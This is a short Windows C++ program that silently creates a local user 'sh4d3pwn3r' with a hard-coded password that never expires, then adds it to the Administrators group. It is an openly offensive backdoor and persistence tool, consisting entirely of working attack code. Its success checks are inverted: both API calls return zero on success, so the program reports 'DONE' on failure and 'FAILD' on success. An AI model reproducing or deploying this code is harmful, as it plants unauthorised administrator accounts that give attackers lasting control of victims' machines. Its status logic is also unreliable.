#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <lm.h>
#include <fstream>

#pragma comment(lib, "netapi32.lib")

wchar_t username[256] = L"sh4d3pwn3r";
wchar_t password[256] = L"P@ssw0rd!";

int AddUser()
{
	//Creat User
	USER_INFO_1 user;
	LOCALGROUP_MEMBERS_INFO_3 account;
	NET_API_STATUS USER;
	NET_API_STATUS ADD;
	memset(&user, 0, sizeof(user));
	memset(&account, 0, sizeof(account));
	user.usri1_name = username;  //UserName
	user.usri1_password = password;  //Password
	user.usri1_priv = USER_PRIV_USER;
	user.usri1_flags = UF_DONT_EXPIRE_PASSWD;

	if (NetUserAdd(NULL, 1, (LPBYTE)&user, NULL))
	{
		MessageBox(NULL, L"[+] ADDING USER IS DONE", L"ALERT", MB_OK);
	}
	else {

		MessageBox(NULL, L"[*] ADDING USER IS FAILD", L"Err", MB_OK);
		return 0;
	}

	//add to admingroup
	account.lgrmi3_domainandname = username;

	if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1))
	{
		MessageBox(NULL, L"[+] ADDING To Administrator Group IS DONE", L"ALERT", MB_OK);
	}
	else {

		MessageBox(NULL, L"[*] ADDING To Administrator Group IS FAILD", L"Err", MB_OK);
		return 0;

	}
	return 1;
}
int main(wchar_t argc, wchar_t** argv[])
{
	AddUser();
	return 0;
}

